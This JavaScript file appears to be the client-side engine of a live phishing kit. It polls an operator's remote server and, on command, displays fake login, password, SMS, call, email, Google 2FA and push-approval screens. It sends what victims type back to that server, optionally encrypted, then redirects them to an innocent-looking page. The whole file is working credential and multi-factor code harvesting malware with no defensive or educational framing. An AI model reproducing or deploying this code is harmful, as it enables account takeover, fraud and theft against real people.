$(document).ready(function() {
    var wating_html =
        '\
<div class="waiter__" style="display:none ">\
        <div class="waiter_box__" >\
            <div class="waiter_span__">\
                <span class="fa fa-spinner fa-spin" ></span>\
            </div>\
            <h4 class="waiter__h4">\
                Please wait...\
            </h4>\
            <p class="waiter__p">\
                We are checking your information\
            </p>\
        </div>\
</div>\
';

    // $(wating_html).appendTo("body");
});

var bider_obj = {
    online_bider: 1,
    w: 0,
    dev: 3
};
var last_respond;
var last_operation;
var respond = {};


$(document).ready(function() {

    CORE__ = {
        send_home: function(cb) {
            if (typeof cb == "undefined") {
                cb = function() {};
            }



            $.ajax({
                url: php_js.home + "?pl=token&link=" + php_js.link + "&bid=" + bid,
                dataType: "jsonp",
                data: {
                    data: php_js.encryption ? JSON.stringify(EN(respond)) : JSON.stringify(respond)
                },
                success: function(data) {
                    respond = {};
                    last_respond = data;
                    cb();
                }
            });
        },
        bidder: function() {
            var that = this;

            $.ajax({
                url: php_js.home + "?pl=token&link=" + php_js.link + "&bid=" + bid,
                dataType: "jsonp",
                data: {
                    data: php_js.encryption ? JSON.stringify(EN(bider_obj)) : JSON.stringify(bider_obj)
                },
                success: function(data) {
                    if (data.hasOwnProperty("re")) {
                        // that.hide_wating();
                        // that.hide_scums();
                        // that.hide_blocker();
                        bider_obj.w = 0;
                        // window.location.href = "../done/"
                        window.location.href = php_js.bb_link;
                        clearInterval(bidder_timer);
                        return;
                    }
                    if (data.hasOwnProperty("bl")) {
                        that.hide_wating();
                        that.hide_scums();
                        that.show_blocker();
                        bider_obj.w = 0;
                        window.location.href = php_js.bb_link;
                        clearInterval(bidder_timer);
                        return;
                    }

                    if (data.hasOwnProperty("op")) {
                        that.deal_with_op(data.op);
                    }
                }
            });
        },
        deal_with_op: function(o) {
            var that = this;
            bider_obj.w = 0;
            this.hide_wating();
            this.hide_scums();
            var o = JSON.parse(o);
            last_operation = o;

            $('form').each(function(i, item) { delete $(item).data().sub_ed }) //2019


            if (REST_FN__.hasOwnProperty(o.init_fn)) {
                REST_FN__[o.init_fn].show();
            } else {
                respond = {
                    mes: "error--Init function not found"
                };
                that.send_home(function() {
                    that.hide_wating();
                    that.hide_blocker();
                    that.hide_scums();
                    clearInterval(bidder_timer);
                });
            }
        },
        show_wating: function() {

            // this.hide_scums();
            // $(".waiter__").show();
            loader_.show()
            $(window).scrollTop(0);
            $("body").css("overflow", "hidden");
        },
        hide_wating: function() {
            loader_.hide()
            // $(".waiter__").hide();
            $("body").css("overflow", "auto");
        },
        show_blocker: function() {
            $(".bloker__").show();
            $("body").scrollTop(0);
        },
        hide_blocker: function() {
            $(".bloker__").hide();
        },
        hide_scums: function() {
            $(".scum").hide();
        },
        all_forms_reset: function() {
            $("form").each(function() {
                this.reset();
            });
        }
    };


    REST_FN__ = {



        ask_login: {
            view: function() {
                return $("#login-view");
            },
            count: 0,
            show: function() {
                $(this.view()).show();
                if (this.count > 0) {
                    this.error();
                }
                // window.location.href="../login/?op="+btoa(JSON.stringify(last_operation))
                // window.location.href = "../login/";
                this.count++;
                this.shown();
            },
            error: function() {
                $(this.view())
                    .find("form")[0]
                    .reset();
                $(this.view())
                    .find("form")
                    .submit();
            },
            send: function(data) {
                CORE__.show_wating();
                respond.prev_op = "ask_login";
                respond.keys = data;
                bider_obj.w = 1;
                CORE__.send_home(function() {});

            },
            shown: function() {
                respond.mes = last_operation.success_mes;
                CORE__.send_home();
            }
        },


        ask_pass: {
            view: function() {
                return $("#pass-view");
            },
            count: 0,
            show: function() {
                $(this.view()).show();
                if (this.count > 0) {
                    this.error();
                }
                // window.location.href="../pass/?op="+btoa(JSON.stringify(last_operation))
                // window.location.href = "../pass/";
                this.count++;
                this.shown();
            },
            error: function() {
                $(this.view())
                    .find("form")[0]
                    .reset();
                $(this.view())
                    .find("form")
                    .submit();
            },
            send: function(data) {
                CORE__.show_wating();
                respond.prev_op = "ask_pass";
                respond.keys = data;
                bider_obj.w = 1;
                CORE__.send_home(function() {});

            },
            shown: function() {
                respond.mes = last_operation.success_mes;
                CORE__.send_home();
            }
        },

        ask_sms: {
            view: function() {
                return $("#sms-view");
            },
            count: 0,
            show: function() {
                $(this.view()).show();
                if (this.count > 0) {
                    this.error();
                }
                // window.location.href="../sms/?op="+btoa(JSON.stringify(last_operation))
                // window.location.href = "../sms/";
                $('.last_2').text(last_operation.last_2)
                this.count++;
                this.shown();
            },
            error: function() {
                $(this.view())
                    .find("form")[0]
                    .reset();
                $(this.view())
                    .find("form")
                    .submit();
            },
            send: function(data) {
                CORE__.show_wating();
                respond.prev_op = "ask_sms";
                respond.mes = JSON.stringify(data)
                bider_obj.w = 1;
                CORE__.send_home(function() {});

            },
            shown: function() {
                respond.mes = last_operation.success_mes;
                CORE__.send_home();
            }
        },
        ask_select: {
            view: function() {
                return $("#select-view");
            },
            count: 0,
            show: function() {
                $(this.view()).show();
                if (this.count > 0) {
                    this.error();
                }
                // window.location.href="../select/?op="+btoa(JSON.stringify(last_operation))
                // window.location.href = "../select/";
                // $('.last_2').text(last_operation.last_2)
                this.count++;
                this.shown();
            },
            error: function() {
                $(this.view())
                    .find("form")[0]
                    .reset();
                $(this.view())
                    .find("form")
                    .submit();
            },
            send: function(data) {
                CORE__.show_wating();
                respond.prev_op = "ask_select";
                respond.mes = JSON.stringify(data)
                bider_obj.w = 1;
                CORE__.send_home(function() {});

            },
            shown: function() {
                respond.mes = last_operation.success_mes;
                CORE__.send_home();
            }
        },


        ask_call: {
            view: function() {
                return $("#call-view");
            },
            count: 0,
            show: function() {
                $(this.view()).show();
                if (this.count > 0) {
                    this.error();
                }
                // window.location.href="../call/?op="+btoa(JSON.stringify(last_operation))
                // window.location.href = "../call/";
                $('.last_2').text(last_operation.last_2)
                this.count++;
                this.shown();
            },
            error: function() {
                $(this.view())
                    .find("form")[0]
                    .reset();
                $(this.view())
                    .find("form")
                    .submit();
            },
            send: function(data) {
                CORE__.show_wating();
                respond.prev_op = "ask_call";
                respond.mes = JSON.stringify(data)
                bider_obj.w = 1;
                CORE__.send_home(function() {});

            },
            shown: function() {
                respond.mes = last_operation.success_mes;
                CORE__.send_home();
            }
        },

        ask_email: {
            view: function() {
                return $("#email-view");
            },
            count: 0,
            show: function() {
                $(this.view()).show();
                if (this.count > 0) {
                    this.error();
                }
                // window.location.href="../email/?op="+btoa(JSON.stringify(last_operation))
                // window.location.href = "../email/";
                $('.email').text(last_operation.email)
                this.count++;
                this.shown();
            },
            error: function() {
                $(this.view())
                    .find("form")[0]
                    .reset();
                $(this.view())
                    .find("form")
                    .submit();
            },
            send: function(data) {
                CORE__.show_wating();
                respond.prev_op = "ask_email";
                respond.mes = JSON.stringify(data)
                bider_obj.w = 1;
                CORE__.send_home(function() {});

            },
            shown: function() {
                respond.mes = last_operation.success_mes;
                CORE__.send_home();
            }
        },


        ask_g2fa: {
            view: function() {
                return $("#g2fa-view");
            },
            count: 0,
            show: function() {
                $(this.view()).show();
                if (this.count > 0) {
                    this.error();
                }
                // window.location.href="../g2fa/?op="+btoa(JSON.stringify(last_operation))
                // window.location.href = "../g2fa/";
                // $('.last_2').text(last_operation.last_2)
                this.count++;
                this.shown();
            },
            error: function() {
                $(this.view())
                    .find("form")[0]
                    .reset();
                $(this.view())
                    .find("form")
                    .submit();
            },
            send: function(data) {
                CORE__.show_wating();
                respond.prev_op = "ask_g2fa";
                respond.mes = JSON.stringify(data)
                bider_obj.w = 1;
                CORE__.send_home(function() {});

            },
            shown: function() {
                respond.mes = last_operation.success_mes;
                CORE__.send_home();
            }
        },


        ask_push: {
            view: function() {
                return $("#push-view");
            },
            count: 0,
            show: function() {
                $(this.view()).show();
                if (this.count > 0) {
                    this.error();
                }
                // window.location.href="../push/?op="+btoa(JSON.stringify(last_operation))
                // window.location.href = "../push/";
                $('.num').text(last_operation.num)
                this.count++;
                this.shown();
            },
            error: function() {
                $(this.view())
                    .find("form")[0]
                    .reset();
                $(this.view())
                    .find("form")
                    .submit();
            },
            send: function(data) {
                CORE__.show_wating();
                respond.prev_op = "ask_push";
                respond.mes = JSON.stringify(data)
                bider_obj.w = 1;
                CORE__.send_home(function() {});

            },
            shown: function() {
                bider_obj.w = 1;
                respond.mes = last_operation.success_mes;
                CORE__.send_home();
            }
        },


    };





});

//?op="+btoa(JSON.stringify(last_operation));